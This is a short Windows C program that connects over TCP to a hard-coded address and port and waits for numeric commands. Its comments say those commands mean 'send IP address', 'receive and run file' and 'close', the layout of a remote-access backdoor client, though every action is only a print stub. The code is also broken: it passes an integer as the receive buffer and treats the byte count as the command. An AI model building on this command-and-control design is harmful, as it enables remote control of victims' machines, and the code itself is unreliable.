#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <tchar.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma warning(disable : 4996)

int main(int argc, char* argv[]) {

	SOCKET client_socket;
	WSADATA wsaStructure;
	int initStatus;
	int exStatus = NULL; // Hold the value of what the program should do
	struct sockaddr_in client_addr;
	char send_data[500] = "Recived";
	char recv_data[500];


	/* Initialize Socket */
	initStatus = WSAStartup(MAKEWORD(2,2), &wsaStructure); 

	if (initStatus != 0) {
		printf("WINSOCK ERROR - Unable to Initialize Socket");
		return 1;
	}
	
	/* Populate struct sockaddr_in client_addr */
	client_socket = socket(AF_INET, SOCK_STREAM, 0);
	client_addr.sin_family = AF_INET;
	client_addr.sin_port = htons(9001);
	client_addr.sin_addr.s_addr = inet_addr("192.168.66.130");


	connect(client_socket, (SOCKADDR*) &client_addr, sizeof(client_addr)); //connect to server 
	recv(client_socket, recv_data, sizeof(recv_data), 0); //recive connection status from server
	printf("Status: %s\n", recv_data);

	memset(recv_data, 0, 500); // reset buffer
	exStatus = recv(client_socket, exStatus, sizeof(exStatus), 0); // wait and get responce on what to do next

	switch (exStatus)//check what to do next
	{
	case 1: // Send the current IPaddr to server
		printf("Sending IPAddr");
		break;
	case 2: // recive and run file
		printf("Recived File");
		break;
	case 3:
		break;
	case 4:
		closesocket(client_socket);
		WSACleanup();
		return 0;
	default:
		break;
	} 
	printf("Staring: %d", exStatus);
	send(client_socket, send_data, sizeof(send_data), 0);
	
	return 0;
}

